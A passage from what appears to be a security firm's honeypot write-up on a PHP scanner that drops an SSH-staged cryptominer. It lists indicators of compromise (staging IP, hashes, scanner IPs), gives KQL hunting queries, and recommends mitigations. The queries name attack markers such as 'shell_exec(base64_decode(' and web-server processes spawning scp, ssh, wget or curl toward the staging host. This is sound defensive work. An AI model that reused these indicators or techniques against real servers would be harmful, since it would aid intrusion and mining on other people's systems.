+<p><strong>Server type.</strong> The container is <code>php:8.3.35-apache</code>: PHP runs as an Apache module, not as <code>php-cgi</code>, on Linux. Query-string arguments are never passed to a PHP command line, so neither CVE-2012-1823 nor CVE-2024-4577 applies.</p>
+<p><strong>Filesystem.</strong> Everything added or changed in the container since it was started:</p>
+<pre><code>C /var
+C /var/www
+C /var/www/html
+A /var/www/html/index.php
+C /usr
+C /usr/local
+C /usr/local/etc
+C /usr/local/etc/php
+C /usr/local/etc/php/conf.d
+A /usr/local/etc/php/conf.d/lab.ini
+C /run
+C /run/apache2
+A /run/apache2/apache2.pid
+C /tmp
+A /tmp/sess_a1b2c3d4e5f6a7b8c9d0e1f2a3
+A /tmp/sess_e8c5242d5187b8d0ec5899c37504c039
+A /tmp/sess_svsp2shell11f31c17
+A /tmp/sess_svsp2shell11f31c57
+A /tmp/mem_test.php
+A /tmp/sess_463abde02ef163a4d075ef88acafc965</code></pre>
+<p>Stage one deletes its own <code>key.ppk</code>, <code>sshcfg</code> and <code>out_sh</code>, so their absence proves little. The miner would stay, and it is not there: no hidden dotfile anywhere in the container, and no <code>/tmp/index1.php</code> from the pearcmd step either. (The session files and <code>mem_test.php</code> are discussed in the <a href="/blog/php2shell-exploitation-in-the-wild/">PHP2Shell post</a>.)</p>
+
+<h2>9. Packet Capture Note</h2>
+<p>The lab ran a rolling packet capture (<code>tcpdump</code>, full snap length, 20 files of 10 MB) on port 80 and the Docker bridges. A ring that small holds about a day and a half of traffic, and the last of it was overwritten on 15 November when the VM was restarted and a large package download passed through the capture filter. The packets for the requests in this post no longer exist. What remains is the nginx request log (request line, User-Agent, Content-Type and the complete request body) and the Apache log from inside the container, both shipped to Microsoft Sentinel as they were written. Every payload on this page is from those two sources.</p>
+
+<h2>10. IOCs</h2>
+<table>
+<tr><th>Type</th><th>Value</th></tr>
+<tr><td>Staging host</td><td><code>217.60.102.5</code> (HTTPS 443 for <code>/sh</code>, <code>/clean</code>, <code>/x86_64</code>, <code>/i686</code>, <code>/aarch64</code>, <code>/arm7</code>, <code>/riscv</code>; SSH 22 for user <code>dlr</code>)</td></tr>
+<tr><td>User-Agent</td><td><code>libredtail-http</code></td></tr>
+<tr><td>Dropper <code>sh</code> SHA-256</td><td><code>917fcc9131c6e9ca16264a85afc62532297bb39eb9d37765dad536c7c8c7735c</code></td></tr>
+<tr><td>Miner <code>x86_64</code> SHA-256</td><td><code>f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987</code></td></tr>
+<tr><td>SSH public key</td><td><code>SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg</code> (comment <code>dlr@sftp</code>)</td></tr>
+<tr><td>Files on disk</td><td><code>key.ppk</code>, <code>sshcfg</code>, <code>out_sh</code>, <code>.redtail</code>, a random dotfile of about 2 MB in a web-user-owned directory</td></tr>
+<tr><td>Response marker</td><td>MD5 of <code>Hello CVE-2024-4577</code>, <code>Hello PHPUnit</code>, <code>Hello</code> or <code>hi</code> in an HTTP response body</td></tr>
+</table>
+<p>Scanner IPs (all sources that sent the User-Agent):</p>
+<table><thead><tr><th>Source IP</th><th>Country</th><th>Requests</th><th>First seen (UTC)</th><th>Last seen (UTC)</th></tr></thead><tbody>
+<tr><td>169.58.137.184</td><td>France</td><td>47</td><td>2026-10-23 14:21</td><td>2026-10-23 14:21</td></tr>
+<tr><td>45.140.193.140</td><td>Brazil</td><td>47</td><td>2026-10-24 03:31</td><td>2026-10-24 03:33</td></tr>
+<tr><td>165.99.207.153</td><td>Pakistan</td><td>47</td><td>2026-10-25 01:54</td><td>2026-10-25 01:54</td></tr>
+<tr><td>102.244.97.185</td><td>Cameroon</td><td>47</td><td>2026-10-25 10:47</td><td>2026-10-25 10:47</td></tr>
+<tr><td>119.15.169.38</td><td>Vietnam</td><td>47</td><td>2026-10-25 17:22</td><td>2026-10-25 17:23</td></tr>
+<tr><td>184.185.26.51</td><td>United States</td><td>47</td><td>2026-10-27 06:40</td><td>2026-10-27 06:40</td></tr>
+<tr><td>101.35.95.146</td><td>China</td><td>47</td><td>2026-10-29 04:43</td><td>2026-10-29 04:43</td></tr>
+<tr><td>157.245.84.42</td><td>United States</td><td>47</td><td>2026-10-29 14:56</td><td>2026-10-29 14:56</td></tr>
+<tr><td>58.182.58.128</td><td>Singapore</td><td>47</td><td>2026-10-29 22:27</td><td>2026-10-29 22:28</td></tr>
+<tr><td>51.159.5.6</td><td>France</td><td>47</td><td>2026-11-04 08:56</td><td>2026-11-04 08:57</td></tr>
+<tr><td>171.34.139.222</td><td>China</td><td>47</td><td>2026-11-05 14:12</td><td>2026-11-05 14:14</td></tr>
+<tr><td>209.99.187.10</td><td>Switzerland</td><td>4</td><td>2026-10-31 14:12</td><td>2026-10-31 14:12</td></tr>
+</tbody></table>
+
+<h2>11. Detection (KQL)</h2>
+<p>The honeypot's nginx log lands in Sentinel's <code>Syslog</code> table as JSON. The scanner and its payload:</p>
+<pre><code class="language-kusto">Syslog
+| where TimeGenerated &gt; ago(7d)
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| extend Client = tostring(j.client), Request = tostring(j.request), UA = tostring(j.user_agent), Body = tostring(j.body), Status = toint(j.status)
+| where UA == "libredtail-http"
+   or Request has_any ("auto_prepend_file", "allow_url_include")
+   or Body has "shell_exec(base64_decode("
+| summarize Requests = count(), Ok200 = countif(Status == 200), First = min(TimeGenerated), Last = max(TimeGenerated) by Client, UA
+| order by First asc</code></pre>
+<p>On real servers, hunt for the behaviour after a hit: a web server process starting <code>scp</code> or <code>ssh</code>, or connecting to the staging host. With Defender for Endpoint on Linux:</p>
+<pre><code class="language-kusto">DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessParentFileName in~ ("apache2", "httpd", "nginx", "php-fpm", "php-cgi", "php")
+     or InitiatingProcessFileName in~ ("apache2", "httpd", "php-fpm", "php-cgi", "php")
+| where FileName in~ ("scp", "ssh", "sftp", "wget", "curl")
+| where ProcessCommandLine has_any ("key.ppk", "sshcfg", "dlr@", "217.60.102.5", "--no-check-certificate")
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+
+DeviceNetworkEvents
+| where Timestamp &gt; ago(30d)
+| where RemoteIP == "217.60.102.5"
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemotePort</code></pre>
+
+<h2>12. Mitigation</h2>
+<ul>
+<li>Block outbound TCP 22 from web servers. A web tier has no reason to open SSH sessions to the internet, and this dropper's first choice depends on it.</li>
+<li>Do not run PHP in CGI mode on Windows (XAMPP's default). If you must, be on PHP 8.3.8 / 8.2.20 / 8.1.29 or later.</li>
+<li>Never deploy <code>vendor/</code> with dev dependencies to a web root. <code>composer install --no-dev</code>, and deny <code>/vendor/</code> at the web server.</li>
+<li>Mount <code>/tmp</code>, <code>/var/tmp</code> and <code>/dev/shm</code> <code>noexec</code>, and make sure the web user owns no executable-capable directory outside them. The dropper checks for exactly this.</li>
+<li>Alert on the User-Agent. It is free signal.</li>
+</ul>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
